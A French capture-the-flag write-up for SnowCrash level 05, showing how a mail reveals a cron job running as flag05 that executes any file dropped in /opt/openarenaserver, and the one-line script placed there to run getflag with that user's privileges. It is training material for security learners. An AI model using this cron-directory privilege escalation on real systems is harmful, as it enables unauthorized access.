# Level 05

Quand on se connecte a la vm on voit une notification apparaitre nous disant qu'on a recu un nouveau mail

```bash
level05@SnowCrash:~$ cd /var/
level05@SnowCrash:/var$ ls
backups  cache  crash  lib  local  lock  log  mail  opt  run  spool  tmp  www
level05@SnowCrash:/var$ cd mail/
level05@SnowCrash:/var/mail$ ls
level05
level05@SnowCrash:/var/mail$ cat level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

On voit que ce mail est un fichier cron qui execute `/usr/sbin/openarenaserver` toute les 2 mins dont le contenu de l'executable est le suivant:
```bash
 level05@SnowCrash:/var/mail$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Un script qui execute tout ce qui se trouve dans '/opt/openarenaserver' puis supprime ce fichier on peut donc l'exploite de cette maniere:

```bash
level05@SnowCrash:/var/mail$ echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/exploit
level05@SnowCrash:/var/mail$ chmod +x /opt/openarenaserver/exploit 
```

Apres 2mins on trouvera un fichier dans /tmp/ avec le contenu de la fonction 'getflag'

```bash
level05@SnowCrash:/var/mail$ cat /tmp/flag05
Check flag.Here is your token : *****************
```